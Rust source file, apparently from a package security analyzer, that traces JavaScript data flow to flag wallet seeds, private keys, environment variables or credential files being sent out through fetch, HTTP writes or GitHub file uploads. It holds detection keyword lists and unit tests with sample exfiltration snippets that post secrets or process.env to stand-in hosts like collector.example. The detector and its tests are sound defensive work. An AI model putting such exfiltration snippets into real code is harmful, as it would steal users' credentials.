mod ancestry;
#[cfg(test)]
mod archive_tests;
mod bundles;
mod destruction;
mod operations;
mod reports;

use oxc_ast::{AstKind, ast::*};
use oxc_semantic::{Semantic, SymbolId};
use oxc_str::JSStr;
use std::cell::RefCell;
use std::collections::{HashMap, HashSet};
use std::rc::Rc;

const SECRET: u8 = 1;
const ENVIRONMENT: u8 = 2;
const CREDENTIAL_FILE: u8 = 4;
const MAX_DEPTH: usize = 32;
const MAX_STEPS: usize = 4096;

/// Steps every candidate of a file may spend together, per byte of source
/// and for any source. Each candidate starts with [`MAX_STEPS`] of its own,
/// so a file of thousands of candidates that each spend them all would
/// take the product. A file that runs out is read with pattern checks
/// only.
const FILE_STEPS_PER_BYTE: usize = 1;
const FILE_STEPS_FLOOR: usize = 16 * MAX_STEPS;

#[derive(Clone, Copy)]
pub(super) struct Leak {
    pub offset: usize,
    pub environment: bool,
    pub credential_file: bool,
}

/// A JavaScript name as its canonical WTF-8 bytes, which keep a name with lone
/// surrogates distinct from every other name.
type NameKey = Box<[u8]>;

/// The object and property name of a member expression with a static name.
///
/// The name is the complete JavaScript string, so a name with lone surrogates
/// stays distinct wherever it identifies a method, export or field.
fn member<'s, 'a>(expression: &'s Expression<'a>) -> Option<(&'s Expression<'a>, JSStr<'s>)> {
    match expression.get_inner_expression() {
        Expression::StaticMemberExpression(value) => {
            Some((&value.object, JSStr::from(value.property.name.as_str())))
        }
        Expression::ComputedMemberExpression(value) => {
            let Expression::StringLiteral(name) = value.expression.get_inner_expression() else {
                return None;
            };
            Some((&value.object, name.value))
        }
        _ => None,
    }
}

/// [`member`] for matching known names: a name with lone surrogates is no
/// known name.
fn named_member<'s, 'a>(expression: &'s Expression<'a>) -> Option<(&'s Expression<'a>, &'s str)> {
    let (object, name) = member(expression)?;
    Some((object, name.as_str()?))
}

fn callee<'s, 'a>(expression: &'s Expression<'a>) -> &'s Expression<'a> {
    let mut current = expression.get_inner_expression();
    while let Expression::SequenceExpression(sequence) = current {
        let Some(last) = sequence.expressions.last() else {
            break;
        };
        current = last.get_inner_expression();
    }
    current
}

fn name<'s>(expression: &'s Expression<'_>) -> Option<&'s str> {
    let expression = callee(expression);
    expression
        .get_identifier_reference()
        .map(|value| value.name.as_str())
        .or_else(|| member(expression).and_then(|(_, name)| name.as_str()))
}

fn secret_name(name: &str) -> bool {
    matches!(
        name.trim_start_matches('_'),
        "privateKey"
            | "secretKey"
            | "mnemonic"
            | "seedPhrase"
            | "private_key"
            | "secret_key"
            | "seed_phrase"
    )
}

pub(super) fn is_candidate(call: &CallExpression<'_>) -> bool {
    matches!(
        name(&call.callee),
        Some(
            "fetch"
                | "createOrUpdateFileContents"
                | "write"
                | "end"
                | "rmSync"
                | "rm"
                | "spawn"
                | "spawnSync"
                | "execFile"
                | "execFileSync"
                | "fork"
                | "eval"
                | "Function"
        )
    )
}

struct Flow<'s, 'a> {
    semantic: &'s Semantic<'a>,
    parameters: HashMap<SymbolId, (u32, usize)>,
    /// The arguments each function's calls pass at each position, by the
    /// function's start and the position, in call order. Calls that omit
    /// the argument cost no steps, so reading them from every call made
    /// each parameter read cost the function's call count.
    arguments: HashMap<(u32, usize), Vec<&'a Expression<'a>>>,
    /// The values a function returns other than `null`, which
    /// [`Flow::interpreter`] skips.
    non_null_returns: HashMap<u32, Vec<&'a Expression<'a>>>,
    methods: HashMap<(u32, bool), HashMap<NameKey, Option<u32>>>,
    ancestry: ancestry::Ancestry,
    defaults: HashMap<SymbolId, &'a Expression<'a>>,
    iterations: HashMap<SymbolId, &'a Expression<'a>>,
    report_writes: HashMap<SymbolId, Vec<reports::Write<'a>>>,
    returns: HashMap<u32, Vec<&'a Expression<'a>>>,
    steps: usize,
    /// Steps the current candidate was given.
    granted: usize,
    /// Steps left for the rest of the file's candidates.
    file_steps: usize,
    /// A candidate got fewer than [`MAX_STEPS`] because the file's steps
    /// ran out.
    over_budget: bool,
    written: HashSet<SymbolId>,
    bundles: bundles::Bundles,
    /// The method each binding destructured from an object names, as
    /// [`Flow::api`] reads it.
    destructured: HashMap<SymbolId, &'a str>,
    objects: RefCell<HashMap<usize, Rc<ObjectFields>>>,
    /// Positions of each array literal's elements that aren't holes or
    /// spreads, by its address. Holes cost no steps, so skipping them for
    /// every candidate cost the array's length each time.
    arrays: RefCell<HashMap<usize, Rc<[usize]>>>,
    /// Positions of each call's last two arguments that aren't spreads,
    /// by the call's address. Finding them skips every trailing spread.
    last_arguments: RefCell<HashMap<usize, [Option<usize>; 2]>>,
}

/// The properties [`Flow::field`] and [`Flow::value`] read of an object
/// literal, by position: its last [`MAX_STEPS`] properties, from the last
/// one back to the first spread or computed key, each name once, the last
/// write first. Reading them from the literal for every step made a
/// candidate's steps cost up to [`MAX_STEPS`] each.
struct ObjectFields {
    positions: Vec<usize>,
    by_name: HashMap<NameKey, usize>,
}

impl ObjectFields {
    fn new(object: &ObjectExpression<'_>) -> Self {
        let mut positions = Vec::new();
        let mut by_name = HashMap::new();
        let count = object.properties.len();
        for (offset, property) in object.properties.iter().rev().take(MAX_STEPS).enumerate() {
            let ObjectPropertyKind::ObjectProperty(property) = property else {
                break;
            };
            let Some(key) = property.key.static_name() else {
                break;
            };
            let position = count - 1 - offset;
            let key: NameKey = key.as_js_str().as_bytes().into();
            if let std::collections::hash_map::Entry::Vacant(entry) = by_name.entry(key) {
                entry.insert(position);
                positions.push(position);
            }
        }
        Self { positions, by_name }
    }
}

/// The element at `position`, which [`Flow::array_values`] found to be an
/// expression.
fn array_value<'e, 'a>(array: &'e ArrayExpression<'a>, position: usize) -> &'e Expression<'a> {
    array.elements[position]
        .as_expression()
        .expect("array_values lists expression elements")
}

/// The value of the property at `position`, which [`ObjectFields`] found
/// to be a property with a static name.
fn property_value<'e, 'a>(object: &'e ObjectExpression<'a>, position: usize) -> &'e Expression<'a> {
    match &object.properties[position] {
        ObjectPropertyKind::ObjectProperty(property) => &property.value,
        ObjectPropertyKind::SpreadProperty(spread) => &spread.argument,
    }
}

impl<'s, 'a> Flow<'s, 'a> {
    /// Starts reading one candidate, with [`MAX_STEPS`] or what is left of
    /// the file's steps.
    fn begin_candidate(&mut self) {
        self.settle_candidate();
        self.granted = MAX_STEPS.min(self.file_steps);
        self.over_budget |= self.granted < MAX_STEPS;
        self.steps = self.granted;
    }

    /// Charges the file for the steps the last candidate spent.
    fn settle_candidate(&mut self) {
        let spent = self.granted - self.steps;
        self.file_steps = self.file_steps.saturating_sub(spent);
        self.granted = self.steps;
    }

    fn object_fields(&self, object: &ObjectExpression<'_>) -> Rc<ObjectFields> {
        let address = std::ptr::from_ref(object).addr();
        Rc::clone(
            self.objects
                .borrow_mut()
                .entry(address)
                .or_insert_with(|| Rc::new(ObjectFields::new(object))),
        )
    }

    /// The call's last two arguments that aren't spreads, the last first.
    fn last_two_arguments<'e>(
        &self,
        call: &'e CallExpression<'a>,
    ) -> [Option<&'e Expression<'a>>; 2] {
        let address = std::ptr::from_ref(call).addr();
        let positions = *self
            .last_arguments
            .borrow_mut()
            .entry(address)
            .or_insert_with(|| {
                let mut positions = call
                    .arguments
                    .iter()
                    .enumerate()
                    .rev()
                    .filter(|(_, argument)| argument.as_expression().is_some())
                    .map(|(position, _)| position);
                [positions.next(), positions.next()]
            });
        positions.map(|position| position.and_then(|p| call.arguments[p].as_expression()))
    }

    fn array_values(&self, array: &ArrayExpression<'_>) -> Rc<[usize]> {
        let address = std::ptr::from_ref(array).addr();
        Rc::clone(self.arrays.borrow_mut().entry(address).or_insert_with(|| {
            array
                .elements
                .iter()
                .enumerate()
                .filter(|(_, element)| element.as_expression().is_some())
                .map(|(position, _)| position)
                .collect()
        }))
    }

    fn symbol(&self, identifier: &IdentifierReference<'_>) -> Option<SymbolId> {
        self.semantic
            .scoping()
            .get_reference(identifier.reference_id.get()?)
            .symbol_id()
    }

    fn initial(&self, identifier: &IdentifierReference<'_>) -> Option<&'a Expression<'a>> {
        let symbol = self.symbol(identifier)?;
        if self.written.contains(&symbol) {
            return None;
        }
        let AstKind::VariableDeclarator(variable) = self
            .semantic
            .nodes()
            .kind(self.semantic.scoping().symbol_declaration(symbol))
        else {
            return None;
        };
        if !matches!(&variable.id, BindingPattern::BindingIdentifier(_)) {
            return None;
        }
        variable.init.as_ref()
    }

    fn global(&self, expression: &Expression<'_>, name: &str) -> bool {
        expression
            .get_inner_expression()
            .get_identifier_reference()
            .is_some_and(|identifier| {
                identifier.name == name && self.semantic.is_reference_to_global_variable(identifier)
            })
    }

    fn class(&self, expression: &Expression<'_>, depth: usize) -> Option<(&'a Class<'a>, bool)> {
        if depth >= 8 {
            return None;
        }
        match expression.get_inner_expression() {
            Expression::Identifier(identifier) => {
                let symbol = self.symbol(identifier)?;
                if self.written.contains(&symbol) {
                    return None;
                }
                match self
                    .semantic
                    .nodes()
                    .kind(self.semantic.scoping().symbol_declaration(symbol))
                {
                    AstKind::Class(class) => Some((class, true)),
                    _ => self.class(self.initial(identifier)?, depth + 1),
                }
            }
            Expression::NewExpression(instance) => self
                .class(&instance.callee, depth + 1)
                .map(|(class, _)| (class, false)),
            Expression::StaticMemberExpression(_) | Expression::ComputedMemberExpression(_) => {
                let (object, export) = member(expression)?;
                let request = match object.get_inner_expression() {
                    Expression::Identifier(identifier) => self.initial(identifier)?,
                    object => object,
                };
                let Expression::CallExpression(request) = request.get_inner_expression() else {
                    return None;
                };
                self.bundles
                    .class(self.semantic, request, export)
                    .map(|class| (class, true))
            }
            _ => None,
        }
    }

    fn target(&self, expression: &Expression<'_>, depth: usize) -> Option<u32> {
        if depth >= 8 {
            return None;
        }
        let expression = callee(expression);
        match expression {
            Expression::Identifier(identifier) => {
                let symbol = self.symbol(identifier)?;
                if self.written.contains(&symbol) {
                    return None;
                }
                match self
                    .semantic
                    .nodes()
                    .kind(self.semantic.scoping().symbol_declaration(symbol))
                {
                    AstKind::Function(function) => Some(function.span.start),
                    _ => self.target(self.initial(identifier)?, depth + 1),
                }
            }
            Expression::FunctionExpression(function) => Some(function.span.start),
            Expression::ArrowFunctionExpression(function) => Some(function.span.start),
            _ => {
                let (object, name) = member(expression)?;
                let (class, static_receiver) = self.class(object, 0)?;
                self.methods
                    .get(&(class.span.start, static_receiver))?
                    .get(name.as_bytes())
                    .copied()
                    .flatten()
            }
        }
    }

    fn value(&mut self, expression: &Expression<'a>, depth: usize) -> u8 {
        if depth >= MAX_DEPTH || self.steps == 0 {
            return 0;
        }
        self.steps -= 1;
        let next = depth + 1;
        match expression.get_inner_expression() {
            Expression::Identifier(identifier) => {
                if let Some(initial) = self.initial(identifier) {
                    return self.value(initial, next);
                }
                let Some(symbol) = self.symbol(identifier) else {
                    return 0;
                };
                if self.written.contains(&symbol) {
                    return self.report_value(identifier, next);
                }
                let Some(&(owner, index)) = self.parameters.get(&symbol) else {
                    return 0;
                };
                if secret_name(identifier.name.as_str()) {
                    return SECRET;
                }
                let key = (owner, index);
                let count = self.arguments.get(&key).map_or(0, Vec::len);
                let mut result = 0;
                for position in 0..count {
                    if self.steps == 0 {
                        break;
                    }
                    let argument = self.arguments[&key][position];
                    result |= self.value(argument, next);
                }
                result
            }
            Expression::StaticMemberExpression(_) | Expression::ComputedMemberExpression(_) => {
                let Some((object, name)) = member(expression) else {
                    return 0;
                };
                if name == "env" && self.global(object, "process") {
                    return ENVIRONMENT;
                }
                if let Some(value) = self.field(object, name, 0) {
                    return self.value(value, next);
                }
                if object
                    .get_inner_expression()
                    .get_identifier_reference()
                    .and_then(|identifier| self.symbol(identifier))
                    .is_some_and(|symbol| self.written.contains(&symbol))
                {
                    return 0;
                }
                if name.as_str().is_some_and(secret_name) {
                    return SECRET;
                }
                0
            }
            Expression::ObjectExpression(object) => {
                let fields = self.object_fields(object);
                let mut result = 0;
                for &position in &fields.positions {
                    if self.steps == 0 {
                        break;
                    }
                    result |= self.value(property_value(object, position), next);
                }
                result
            }
            Expression::ArrayExpression(array) => {
                let mut result = 0;
                for &position in self.array_values(array).iter() {
                    if self.steps == 0 {
                        break;
                    }
                    result |= self.value(array_value(array, position), next);
                }
                result
            }
            Expression::TemplateLiteral(template) => {
                let mut result = 0;
                for value in &template.expressions {
                    if self.steps == 0 {
                        break;
                    }
                    result |= self.value(value, next);
                }
                result
            }
            Expression::BinaryExpression(binary) if binary.operator.as_str() == "+" => {
                self.value(&binary.left, next) | self.value(&binary.right, next)
            }
            Expression::ConditionalExpression(value) => {
                self.value(&value.consequent, next) | self.value(&value.alternate, next)
            }
            Expression::LogicalExpression(value) => {
                self.value(&value.left, next) | self.value(&value.right, next)
            }
            Expression::AwaitExpression(value) => self.value(&value.argument, next),
            Expression::SequenceExpression(sequence) => sequence
                .expressions
                .last()
                .map_or(0, |value| self.value(value, next)),
            Expression::CallExpression(call) => {
                let function = callee(&call.callee);
                let Some(function_name) = name(function) else {
                    return 0;
                };
                if self.target(function, 0).is_some()
                    || member(function)
                        .is_some_and(|(object, property)| self.field(object, property, 0).is_some())
                {
                    return 0;
                }
                if self.credential_read(call, next) {
                    return CREDENTIAL_FILE;
                }
                if matches!(
                    function_name,
                    "generateSeed"
                        | "generatePrivateKey"
                        | "generateMnemonic"
                        | "mnemonicToSeedSync"
                        | "mnemonicToSeed"
                ) {
                    return SECRET;
                }
                if matches!(
                    function_name,
                    "slice" | "substring" | "substr" | "split" | "reverse" | "join" | "toString"
                ) {
                    return member(function).map_or(0, |(object, _)| self.value(object, next));
                }
                if self.api(function, 0).is_some_and(|api| {
                    matches!(
                        (api.module, api.method),
                        ("dotenv", Some("parse")) | ("zlib", Some("gzipSync" | "deflateSync"))
                    )
                }) {
                    return call
                        .arguments
                        .first()
                        .and_then(Argument::as_expression)
                        .map_or(0, |value| self.value(value, next));
                }
                let encoding = matches!(
                    function_name,
                    "encode" | "bytesToHex" | "toBuffer" | "btoa" | "encodeURIComponent"
                ) || member(function).is_some_and(|(object, method)| {
                    (method == "stringify" && self.global(object, "JSON"))
                        || (method == "from" && self.global(object, "Buffer"))
                });
                if encoding {
                    return call
                        .arguments
                        .first()
                        .and_then(Argument::as_expression)
                        .map_or(0, |value| self.value(value, next));
                }
                0
            }
            _ => 0,
        }
    }

    fn field<'e>(
        &self,
        expression: &'e Expression<'a>,
        field: JSStr<'_>,
        depth: usize,
    ) -> Option<&'e Expression<'a>>
    where
        'a: 'e,
    {
        if depth >= 8 {
            return None;
        }
        match expression.get_inner_expression() {
            Expression::Identifier(identifier) => {
                self.field(self.initial(identifier)?, field, depth + 1)
            }
            Expression::CallExpression(call)
                if member(&call.callee).is_some_and(|(object, method)| {
                    method == "freeze" && self.global(object, "Object")
                }) =>
            {
                self.field(call.arguments.first()?.as_expression()?, field, depth + 1)
            }
            Expression::ObjectExpression(object) => {
                let position = *self.object_fields(object).by_name.get(field.as_bytes())?;
                Some(property_value(object, position))
            }
            _ => None,
        }
    }

    fn sink(&self, call: &'a CallExpression<'a>) -> Option<&'a Expression<'a>> {
        let function = callee(&call.callee);
        let fetch = self.global(function, "fetch")
            || member(function).is_some_and(|(object, method)| {
                method == "fetch"
                    && (self.global(object, "globalThis") || self.global(object, "window"))
            });
        if fetch {
            let url = call.arguments.first()?.as_expression()?;
            let Expression::StringLiteral(url) = url.get_inner_expression() else {
                return None;
            };
            if !url.value.starts_with("https://") && !url.value.starts_with("http://") {
                return None;
            }
            return call.arguments.get(1)?.as_expression();
        }
        if let Some((request, "write" | "end")) = named_member(function)
            && self.http_request(request, 0)
        {
            return call.arguments.first()?.as_expression();
        }
        let (repos, "createOrUpdateFileContents") = named_member(function)? else {
            return None;
        };
        let (rest, "repos") = named_member(repos)? else {
            return None;
        };
        let (_, "rest") = named_member(rest)? else {
            return None;
        };
        self.field(
            call.arguments.first()?.as_expression()?,
            "content".into(),
            0,
        )
    }
}

fn is_source_candidate(kind: AstKind<'_>) -> bool {
    match kind {
        AstKind::FormalParameter(parameter) => {
            matches!(&parameter.pattern, BindingPattern::BindingIdentifier(identifier) if secret_name(identifier.name.as_str()))
        }
        AstKind::StaticMemberExpression(member) => {
            secret_name(member.property.name.as_str()) || member.property.name == "env"
        }
        AstKind::ComputedMemberExpression(member) => {
            matches!(member.expression.get_inner_expression(), Expression::StringLiteral(name) if name.value.as_str().is_some_and(secret_name) || name.value == "env")
        }
        AstKind::CallExpression(call) => matches!(
            name(&call.callee),
            Some(
                "generateSeed"
                    | "generatePrivateKey"
                    | "generateMnemonic"
                    | "mnemonicToSeedSync"
                    | "mnemonicToSeed"
            )
        ),
        _ => false,
    }
}

/// The method name [`Flow::api`] reads for each binding a declarator
/// destructures from an object: the first property of the declarator's
/// own pattern that binds it and has a plain name. Finding it in the
/// pattern for every call cost the pattern's size each time.
fn destructured_methods<'a>(semantic: &Semantic<'a>) -> HashMap<SymbolId, &'a str> {
    let mut methods = HashMap::new();
    for node in semantic.nodes().iter() {
        let AstKind::VariableDeclarator(variable) = node.kind() else {
            continue;
        };
        let BindingPattern::ObjectPattern(pattern) = &variable.id else {
            continue;
        };
        for property in &pattern.properties {
            let BindingPattern::BindingIdentifier(binding) = &property.value else {
                continue;
            };
            let Some(symbol) = binding.symbol_id.get() else {
                continue;
            };
            let name = match &property.key {
                PropertyKey::StaticIdentifier(key) => Some(key.name.as_str()),
                PropertyKey::StringLiteral(key) => key.value.as_str(),
                _ => None,
            };
            if let Some(name) = name
                && semantic.scoping().symbol_declaration(symbol) == node.id()
            {
                methods.entry(symbol).or_insert(name);
            }
        }
    }
    methods
}

fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
    let ancestry = ancestry::Ancestry::new(semantic);
    let bundles = bundles::Bundles::collect(semantic, &ancestry);
    let source_len =
        oxc_span::GetSpan::span(&semantic.nodes().kind(oxc_semantic::NodeId::ROOT)).end as usize;
    let mut flow = Flow {
        semantic,
        parameters: HashMap::new(),
        arguments: HashMap::new(),
        non_null_returns: HashMap::new(),
        methods: HashMap::new(),
        returns: HashMap::new(),
        report_writes: HashMap::new(),
        ancestry,
        defaults: HashMap::new(),
        iterations: HashMap::new(),
        steps: MAX_STEPS,
        granted: MAX_STEPS,
        file_steps: source_len
            .saturating_mul(FILE_STEPS_PER_BYTE)
            .max(FILE_STEPS_FLOOR),
        over_budget: false,
        destructured: destructured_methods(semantic),
        objects: RefCell::new(HashMap::new()),
        arrays: RefCell::new(HashMap::new()),
        last_arguments: RefCell::new(HashMap::new()),
        written: semantic
            .scoping()
            .symbol_ids()
            .filter(|symbol| {
                semantic
                    .scoping()
                    .get_resolved_references(*symbol)
                    .any(|reference| reference.is_write())
            })
            .collect(),
        bundles,
    };
    for node in semantic.nodes().iter() {
        if let AstKind::Class(class) = node.kind() {
            for element in &class.body.body {
                if let ClassElement::MethodDefinition(method) = element
                    && let Some(name) = method.key.static_name()
                {
                    let target = (method.kind == MethodDefinitionKind::Method
                        && method.decorators.is_empty())
                    .then_some(method.value.span.start);
                    flow.methods
                        .entry((class.span.start, method.r#static))
                        .or_default()
                        .insert(name.as_js_str().as_bytes().into(), target);
                }
            }
        }
    }
    for node in semantic.nodes().iter() {
        if let AstKind::AssignmentExpression(assignment) = node.kind() {
            let object = match &assignment.left {
                AssignmentTarget::StaticMemberExpression(member) => Some(&member.object),
                AssignmentTarget::ComputedMemberExpression(member) => Some(&member.object),
                _ => None,
            };
            if let Some(object) = object {
                if let AssignmentTarget::StaticMemberExpression(member) = &assignment.left
                    && member.property.name != "prototype"
                    && let Some((class, true)) = flow.class(object, 0)
                    && !flow
                        .methods
                        .get(&(class.span.start, true))
                        .is_some_and(|methods| {
                            methods.contains_key(member.property.name.as_str().as_bytes())
                        })
                {
                    continue;
                }
                super::bindings::mark_mutated_receiver(object, semantic, &mut flow.written, 0);
            }
        }
    }
    for node in semantic.nodes().iter() {
        let (owner, parameters) = match node.kind() {
            AstKind::Function(function) => (function.span.start, &function.params),
            AstKind::ArrowFunctionExpression(function) => (function.span.start, &function.params),
            _ => continue,
        };
        for (index, parameter) in parameters.items.iter().enumerate() {
            let pattern = if let BindingPattern::AssignmentPattern(assignment) = &parameter.pattern
            {
                if let BindingPattern::BindingIdentifier(identifier) = &assignment.left
                    && let Some(symbol) = identifier.symbol_id.get()
                {
                    flow.defaults.insert(symbol, &assignment.right);
                }
                &assignment.left
            } else {
                &parameter.pattern
            };
            if let BindingPattern::BindingIdentifier(identifier) = pattern
                && let Some(symbol) = identifier.symbol_id.get()
            {
                flow.parameters.insert(symbol, (owner, index));
            }
        }
    }
    for node in semantic.nodes().iter() {
        if let AstKind::CallExpression(call) = node.kind()
            && let Some(target) = flow.target(&call.callee, 0)
        {
            for (position, argument) in call.arguments.iter().enumerate() {
                if let Some(argument) = argument.as_expression() {
                    flow.arguments
                        .entry((target, position))
                        .or_default()
                        .push(argument);
                }
            }
        }
    }
    for node in semantic.nodes().iter() {
        if let AstKind::CallExpression(call) = node.kind()
            && let Some((object, "filter")) = named_member(&call.callee)
            && let Some(predicate) = call.arguments.first().and_then(Argument::as_expression)
        {
            let parameters = match predicate.get_inner_expression() {
                Expression::ArrowFunctionExpression(function) => Some(&function.params),
                Expression::FunctionExpression(function) => Some(&function.params),
                _ => None,
            };
            if let Some(parameters) = parameters
                && let Some(parameter) = parameters.items.first()
                && let BindingPattern::BindingIdentifier(identifier) = &parameter.pattern
                && let Some(symbol) = identifier.symbol_id.get()
            {
                flow.iterations.insert(symbol, object);
            }
        }
        if let AstKind::ArrowFunctionExpression(function) = node.kind()
            && let Some(expression) = function.get_expression()
        {
            flow.returns
                .entry(function.span.start)
                .or_default()
                .push(expression);
        }
    }
    for node in semantic.nodes().iter() {
        if let AstKind::ReturnStatement(statement) = node.kind()
            && flow.ancestry.reachable(node.id())
            && let Some(value) = &statement.argument
            && let Some(owner) = flow.ancestry.function_or_arrow_start(semantic, node.id())
        {
            flow.returns.entry(owner).or_default().push(value);
        }
    }
    flow.non_null_returns = flow
        .returns
        .iter()
        .map(|(&target, values)| {
            let values = values
                .iter()
                .copied()
                .filter(|value| !matches!(value.get_inner_expression(), Expression::NullLiteral(_)))
                .collect();
            (target, values)
        })
        .collect();
    flow.report_writes = reports::collect(&flow);
    flow
}

pub(super) fn analyze(semantic: &Semantic<'_>, facts: &mut super::bindings::CallFacts) {
    let has_sources = semantic.nodes().iter().any(|node| is_source_candidate(node.kind())
        || matches!(node.kind(), AstKind::StringLiteral(value) if matches!(value.value.as_str(), Some("fs" | "node:fs" | "fs/promises" | "node:fs/promises"))));
    let has_operations = operations::has_candidates(semantic);
    let has_sink = semantic.nodes().iter().any(|node| match node.kind() {
        AstKind::CallExpression(call) => is_candidate(call),
        AstKind::NewExpression(call) => name(&call.callee) == Some("Function"),
        _ => false,
    });
    if !(has_operations || has_sources && has_sink) {
        return;
    }
    let mut flow = build_flow(semantic);
    if has_operations {
        operations::analyze(&mut flow, facts);
    }
    if has_sources {
        exfiltration(&mut flow, facts);
    }
    flow.settle_candidate();
    facts.over_budget |= flow.over_budget;
}

fn exfiltration(flow: &mut Flow<'_, '_>, facts: &mut super::bindings::CallFacts) {
    let semantic = flow.semantic;
    let candidates = semantic
        .nodes()
        .iter()
        .filter_map(|node| match node.kind() {
            AstKind::CallExpression(call) if is_candidate(call) => Some((node.id(), call)),
            _ => None,
        });
    for (id, call) in candidates {
        if !flow.ancestry.reachable(id) {
            continue;
        }
        let Some(payload) = flow.sink(call) else {
            continue;
        };
        flow.begin_candidate();
        let value = if name(&call.callee) == Some("fetch") {
            let headers = flow.field(payload, "headers".into(), 0);
            let body = flow.field(payload, "body".into(), 0);
            headers.map_or(0, |value| flow.value(value, 0))
                | body.map_or(0, |value| flow.value(value, 0))
        } else {
            flow.value(payload, 0)
        };
        if value != 0 {
            facts.credential_exfiltration = Some(Leak {
                offset: call.span.start as usize,
                environment: value & ENVIRONMENT != 0,
                credential_file: value & CREDENTIAL_FILE != 0,
            });
            return;
        }
    }
}

#[cfg(test)]
mod tests {
    fn leaks(source: &str) -> bool {
        let result = super::super::analyze_bytes("index.js", source.as_bytes());
        assert_eq!(result.unparsed_files, 0, "invalid control: {source}");
        serde_json::to_value(result.supply_chain).unwrap()["credentialExfiltration"] == true
    }

    #[test]
    fn wallet_seed_in_an_outbound_header_is_a_security_finding() {
        assert!(leaks(
            "const seed = wallet.generateSeed(); fetch('https://collector.example/upload', {headers: {'x-session': seed}});"
        ));
    }

    #[test]
    fn secret_passed_through_a_static_encoding_helper_is_a_security_finding() {
        assert!(leaks(
            "class Transport { static send(value) { const data = bs58.encode(value); fetch('https://collector.example/upload', {headers: {'x-session': data.substring(0,24).split('').reverse().join('')}}); } } function use(secretKey) { Transport.send(secretKey); }"
        ));
    }

    #[test]
    fn entire_environment_uploaded_through_a_repository_helper_is_a_security_finding() {
        assert!(leaks(
            "class Publisher { async publish(data) { await this.client.rest.repos.createOrUpdateFileContents({content: Buffer.from(data).toString('base64')}); } } const publisher = new Publisher(); const payload = {environment: process.env}; publisher.publish(JSON.stringify(payload));"
        ));
    }

    #[test]
    fn bundled_class_helper_preserves_the_environment_upload_flow() {
        assert!(leaks(
            r#"var modules = {17: (m,e,r) => { r.d(e, {Publisher: () => Publisher}); class Publisher { publish(data) { this.client.rest.repos.createOrUpdateFileContents({content: Buffer.from(data).toString('base64')}); } } }}; function load(id) { const m = {exports:{}}; modules[id].call(m.exports,m,m.exports,load); return m.exports; } const api = load(17); const publisher = new api.Publisher(); publisher.publish(JSON.stringify({environment:process.env}));"#
        ));
    }

    #[test]
    fn source_in_the_middle_of_a_four_megabyte_bundle_is_analyzed() {
        let mut source = String::from("/*");
        source.push_str(&" ".repeat(1536 * 1024));
        source.push_str("*/const seed = wallet.generateSeed(); fetch('https://collector.example/upload', {headers: {'x-session': seed}});");
        source.push_str("/*");
        source.push_str(&" ".repeat(1536 * 1024));
        source.push_str("*/");
        let directory = tempfile::tempdir().unwrap();
        let mut analyzer = super::super::PackageAnalyzer::new();
        analyzer.feed(std::path::Path::new("bundle.js"), source.as_bytes());
        let result = analyzer.finalize(directory.path());
        assert_eq!(
            serde_json::to_value(result.supply_chain).unwrap()["credentialExfiltration"],
            true
        );
    }

    #[test]
    fn disjoint_file_samples_do_not_establish_a_secret_flow() {
        let mut source = String::from("function privateWork(secretKey) {/*");
        source.push_str(&" ".repeat(2 * 1024 * 1024));
        source.push_str("*/ return; } function publicWork() { const secretKey = 'public'; /*");
        source.push_str(&" ".repeat(2 * 1024 * 1024));
        source.push_str("*/ fetch('https://api.example', {body: secretKey}); }");
        let directory = tempfile::tempdir().unwrap();
        let mut analyzer = super::super::PackageAnalyzer::new();
        analyzer.feed(std::path::Path::new("bundle.js"), source.as_bytes());
        let result = analyzer.finalize(directory.path());
        assert!(!result.meta.oversized_source_files.is_empty());
        assert!(!result.supply_chain.credential_exfiltration);
        assert!(
            !result
                .meta
                .evidence
                .iter()
                .any(|entry| entry.rule_id == "credential-exfiltration")
        );
    }

    #[test]
    fn overwritten_secrets_and_unused_fetch_options_do_not_report_leaks() {
        for source in [
            "function send(secretKey) { secretKey = 'public'; fetch('https://api.example', {body: secretKey}); }",
            "function send(secretKey) { fetch('https://api.example', {headers: {session: secretKey, session: 'public'}}); }",
            "fetch('https://api.example', {environment: process.env});",
            "function send(secretKey) { const options = {body: secretKey, body: 'public'}; fetch('https://api.example', options); }",
        ] {
            assert!(!leaks(source), "{source}");
        }
    }

    #[test]
    fn computed_properties_that_can_replace_a_payload_do_not_establish_a_secret_flow() {
        for source in [
            "function send(secretKey) { const key = 'body'; fetch('https://api.example', {body: secretKey, [key]: 'public'}); }",
            "function send(secretKey) { const key = 'headers'; fetch('https://api.example', {headers: {session: secretKey}, [key]: {session:'public'}}); }",
        ] {
            assert!(!leaks(source), "{source}");
        }
        assert!(leaks(
            "function send(secretKey, key) { fetch('https://api.example', {[key]: 'public', body: secretKey}); }"
        ));
    }

    #[test]
    fn mutated_objects_and_distinct_method_receivers_do_not_link_unrelated_values() {
        for source in [
            "function send(secretKey) { const options = {body: secretKey}; options.body = 'public'; fetch('https://api.example', options); }",
            "function send(secretKey) { const options = {body: secretKey}; const alias = options; alias.body = 'public'; fetch('https://api.example', options); }",
            "const keys = {privateKey:'public-id'}; fetch('https://api.example', {body: keys.privateKey});",
            "class Transport { static send(value) { fetch('https://api.example', {body:value}); } send(value) {} } new Transport().send(process.env);",
        ] {
            assert!(!leaks(source), "{source}");
        }
    }

    #[test]
    fn unrelated_class_properties_do_not_hide_a_secret_upload() {
        assert!(leaks(
            "class Transport { static send(value) { fetch('https://collector.example', {body:value}); } } Transport.chunkSize = 100; function send(secretKey) { Transport.send(secretKey); }"
        ));
    }

    // `\uD800` is a lone surrogate, which has no UTF-8 form, and `\\ud800` is the
    // six-character text a lossy conversion would turn it into.
    #[test]
    fn a_method_named_with_a_lone_surrogate_still_links_a_secret_upload() {
        assert!(leaks(
            r#"class Transport { static ["\uD800"](value) { fetch('https://collector.example', {body:value}); } } function send(secretKey) { Transport["\uD800"](secretKey); }"#
        ));
    }

    #[test]
    fn a_method_named_with_a_lone_surrogate_stays_distinct_from_its_escaped_text() {
        assert!(leaks(
            r#"class Transport { static ["\uD800"](value) { fetch('https://collector.example', {body:value}); } static ["\\ud800"](value) { return value; } } function send(secretKey) { Transport["\uD800"](secretKey); }"#
        ));
    }

    #[test]
    fn local_functions_with_wallet_api_names_do_not_establish_secret_origins() {
        for source in [
            "const wallet = {generateSeed: () => 'public-id'}; fetch('https://api.example', {body: wallet.generateSeed()});",
            "function generateSeed() { return 'public-id'; } fetch('https://api.example', {body: generateSeed()});",
            "function encode(secretKey) { return 'redacted'; } function send(privateKey) { fetch('https://api.example', {body: encode(privateKey)}); }",
        ] {
            assert!(!leaks(source), "{source}");
        }
    }

    #[test]
